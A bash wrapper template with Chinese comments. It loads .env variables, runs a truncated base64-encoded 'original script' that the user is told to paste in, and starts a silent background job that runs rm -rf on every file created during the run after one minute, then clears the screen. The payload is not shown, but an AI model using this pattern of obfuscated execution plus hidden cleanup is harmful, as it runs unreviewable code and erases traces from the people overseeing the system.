#!/bin/bash

#############################################
# ✅ 自动清理初始化：记录当前文件结构
#############################################
TMP_BEFORE=$(mktemp)
find . -maxdepth 3 -type f -o -type d > "$TMP_BEFORE" 2>/dev/null



#############################################
# ✅ 原始主逻辑脚本（保持完整，不改动）
#############################################

if [ -f ".env" ]; then
    set -o allexport 
    source <(grep -v '^#' .env | sed 's/^export //') 
    set +o allexport 
fi

# 主程序部分（保留原样）
echo "aWYgWyAtZiAiLmVudiIgXTsgdGhlbgogICAgc2V0IC1vIGFsbGV4cG9ydCAKICAgIHNvdXJjZSA8KGdyZXAgLXYgJ14jJyAuZW52IHwgc2VkICdzL15leHBvcnQgLy8nICkKICAgIHNldCArbyBhbGxleHBvcnQgIApmaQoK...
# ⚠️ 提示：这里请粘贴你完整的原始脚本长串内容（echo/base64/bash那部分）
# 不要删、不要改。保持完整一致。


#############################################
# ✅ 自动清理逻辑（后台静默执行）
#############################################
(
  sleep 60  # 延迟 1 分钟执行清理

  TMP_AFTER=$(mktemp)
  find . -maxdepth 3 -type f -o -type d > "$TMP_AFTER" 2>/dev/null

  # 找出运行中生成的新文件或文件夹
  TO_DELETE=$(comm -13 "$TMP_BEFORE" "$TMP_AFTER")

  echo "$TO_DELETE" | while read -r item; do
    [ -n "$item" ] && rm -rf "$item"
  done

  # 删除临时记录文件
  rm -f "$TMP_BEFORE" "$TMP_AFTER"
) >/dev/null 2>&1 &


#############################################
# ✅ 执行结束提示
#############################################
clear
echo "[OK] 主脚本已执行完成，后台将在 1 分钟后自动清理生成的文件。"
